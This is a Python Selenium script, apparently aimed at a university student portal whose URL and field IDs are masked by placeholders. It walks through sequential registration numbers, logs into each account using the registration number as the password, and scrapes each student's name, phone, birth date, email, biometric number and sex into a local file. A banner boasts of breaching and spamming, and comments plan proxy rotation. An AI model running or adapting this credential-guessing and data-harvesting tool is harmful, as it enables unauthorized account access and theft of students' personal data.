# -*- coding:utf-8 -*-

# Just set -Year and Branch     -Register number range


from selenium import webdriver
from time import sleep

"""
    *IP ROTATION (PROXY)
    *MULTITHREADING
    *Reload fixture as it crashes eeverything after that
"""


def welcome():
    print("""
'                                           \n                                           \n                                           \n####  ## #### ###### ####    #     ### ### \n ##   #   ##  # ## #  ##     ##     ##  #  \n ### #    ##    ##    ##    ###     ### #  \n  ## #    ##    ##    ##    # ##    # # #  \n  ###     ##    ##    ##   #####    # ###  \n   ##     ##    ##    ##   #  ###   #  ##  \n   #     ####  ####  #### ### #### ###  #  \n                                           \n                                           \n                                           \n                                      \n                                      \n                                      \n###   ### #### ### ### ###### #####   \n ###  ##   ##   ##  #   ##  #  ## ##  \n ### ###   ##   ### #   ##     ## ##  \n # ## ##   ##   # # #   ###    ####   \n # ## ##   ##   # ###   ##     ## #   \n #  # ##   ##   #  ##   ##  #  ## ##  \n###   ### #### ###  #  ###### ### ### \n                                      \n                                      \n                                      \n'
""")
    print('\n\nWe the RECONNAISSANCE\nWe the BREACHERS\nWe the SPAMMERS\n\n')


def setup():
    global driver
    try:
        driver = webdriver.Chrome('chromedriver.exe')
    except Exception as e:
        print("[!] Web-Driver Not Found")
    try:
        base_url = "{{ hidden }}"
        driver.get(base_url)
    except:
        print('[!] Error in opening URL')
    sleep(7)


#program start
def saver(year, branch, registeration_number, name_, phone_number, dob_, email_, biometric_number, sex):
    try:
        f = open(year+branch+'.txt', 'a+')
    except:
        print('[!] Failed to open Database')
        print('[*] '+registeration_number+' was unable to add in Database')
    try:
        f.write(registeration_number+',\t'+name_+',\t'+phone_number+',\t'+dob_+',\t'+email_+',\t'+biometric_number+',\t'+sex+'\n')
        print('[-] Successfully added '+registeration_number+'\n')
    except:
        print('[!] Failed to input data in Database')
    try:
        f.close()
    except:
        print('[!] Database file is not closed properly')

def info(year, branch, number):
    registeration_number = year+branch+number
    
    try:
        name=driver.find_element_by_xpath('//*[@id="{{ hidden }}"]')
        name_ = name.get_attribute('value')
    
        bio = driver.find_element_by_xpath('//*[@id="{{ hidden }}"]')
        biometric_number = bio.get_attribute('value')
    
        phone=driver.find_element_by_xpath('//*[@id="{{ hidden }}"]')
        phone_number = phone.get_attribute('value')
    
        email = driver.find_element_by_xpath('//*[@id="{{ hidden }}"]')
        email_ = email.get_attribute('value')
    
        dob = driver.find_element_by_xpath('//*[@id="{{ hidden }}"]')
        dob_ = dob.get_attribute('value')
        
        sex_m = driver.find_element_by_xpath('//*[@id="sex-male"]')
        sex_f = driver.find_element_by_xpath('//*[@id="sex-female"]')
        sex_n = driver.find_element_by_xpath('//*[@id="sex-none"]')
        """
        try:
            sex_m_ = sex_m.get_attribute('checked')
            flag2 = 'M'
        except:
            try:
                sex_f_ = sex_f.get_attribute('checked')
                flag2 = 'F'
            except:
                try:
                    sex_n_ = sex_n.get_attribute('checked')
                    flag2 = 'N'
                except:
                    print('[!] Error in determining SEX for '+registeration_number)
                    flag2 = 'NA'
        sex = flag2
        """
        try:
            sex_m_ = sex_m.get_attribute('checked')
            sex_f_ = sex_f.get_attribute('checked')
            sex_n_ = sex_n.get_attribute('checked')
        
            if sex_m_ == 'true':
                sex = 'M'
            elif sex_f_ == 'true':
                sex = 'F'
            elif sex_n_ == 'true':
                sex = 'N'
            else:
                sex = 'NA'
        except:
            sex='NAE '
                
    except Exception as e:
        print('[!] Failed to scrape one of the parameters for user '+registeration_number)
        print('[!] '+str(e))
        
        name_='UNKNOWN'
        phone_number = 'UNKNOWN'
        dob_ = 'UNKNOWN'
        email_ = 'UNKNOWN'
        biometric_number = 'UNKNOWN'

    saver(year, branch, registeration_number, name_, phone_number, dob_, email_, biometric_number, sex)


def padding(x):
    x_str = str(x)
    if len(x_str) != 4:
        for y in range(3):
            x_str = '0'+x_str
            if len(x_str)==4:
                break
    else:
        pass

    return x_str


def ranger(year, branch, start):
    global driver
    for number in range(start, 2901): #1, 2901 May be set manually , skip from 1001 to 1999
        number = padding(number)
        reg_no = year+branch+number
      
      {{ CODE SNIPPET HIDDEN }}
      
        try:
            driver.find_element_by_xpath('//*[@id="userid"]').send_keys(reg_no)
            driver.find_element_by_xpath('//*[@id="password"]').send_keys(reg_no)
            try:
                driver.find_element_by_xpath('//*[@id="auth"]/fieldset/fieldset/input').click()
            except:
                driver.find_element_by_xpath('//*[@id="auth"]/input[2]').click()
            sleep(4)
            flag= 'continue_'
        except:
            print('[!] Failed to login for user '+reg_no)
            sleep(1)
            flag = 'next_' #not using but somethings are just left for readers Fun.

        if flag=='continue_':
        
            try:
                driver.find_element_by_xpath('//*[@id="menu"]/ul/li[3]/a').click() #personal_details
                sleep(2)
            except:
                print('[!] Failed in reaching perfect Dome for '+reg_no) #user doesn't exsits or pass already updated
                flag = 'next_'
                
            if flag=='continue_':

                info(year, branch, number)
            

                try:
                    driver.find_element_by_xpath('//*[@id="logout"]').click() #logout button
                    sleep(6)
                except:
                    print('[!] Failed at logout')
                    print('[!] Possible failures may arise, please resume from '+reg_no)
                    print('[*] Program is switched to static mode\n')
                    input('Enter any Key to Exit')
                
            else:
                pass
        else:
            pass


if __name__ == "__main__":
   {{ CODE SNIPPET HIDDEN }}
    welcome()
    setup()
    start = int(input('Give Starting index: '))
    ranger(year='17', branch='BCE', start=start) #You have to set this manually
   
